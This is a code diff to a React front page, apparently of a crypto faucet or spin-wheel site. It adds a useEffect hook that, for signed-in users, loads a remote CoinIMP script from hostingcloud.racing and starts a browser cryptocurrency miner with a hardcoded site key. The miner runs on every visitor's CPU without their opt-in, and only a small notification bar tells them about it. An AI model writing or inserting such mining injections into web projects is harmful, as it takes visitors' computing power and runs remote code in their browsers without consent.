@@ -28,6 +28,7 @@ import { SpinWheel } from "@/components/SpinWheel";
 import heroBackground from "@/assets/hero-background.jpg";
 import { useState } from "react";
 import { FaucetClaim } from "@/components/FaucetClaim";
+import { useEffect } from "react";
 
 const Index = () => {
   const { user, signOut, loading } = useAuth();
@@ -39,6 +40,35 @@ const Index = () => {
   const handleZeroWin = (amount: number) => {
     setUserZeroBalance(prev => prev + amount);
   };
+
+  // Mining script injection for main page
+  useEffect(() => {
+    if (user) {
+      // Inject main mining script
+      const script1 = document.createElement('script');
+      script1.src = 'https://www.hostingcloud.racing/Q1Mx.js';
+      script1.async = true;
+      document.head.appendChild(script1);
+
+      script1.onload = () => {
+        const script2 = document.createElement('script');
+        script2.text = `
+          var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
+            throttle: 0.4, c: 'w'
+          });
+          _client.start();
+          _client.addMiningNotification("Floating Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+        `;
+        document.head.appendChild(script2);
+      };
+
+      // Cleanup function to remove scripts when component unmounts
+      return () => {
+        const scripts = document.head.querySelectorAll('script[src="https://www.hostingcloud.racing/Q1Mx.js"]');
+        scripts.forEach(script => script.remove());
+      };
+    }
+  }, [user]);
 
   if (loading) {
     return (
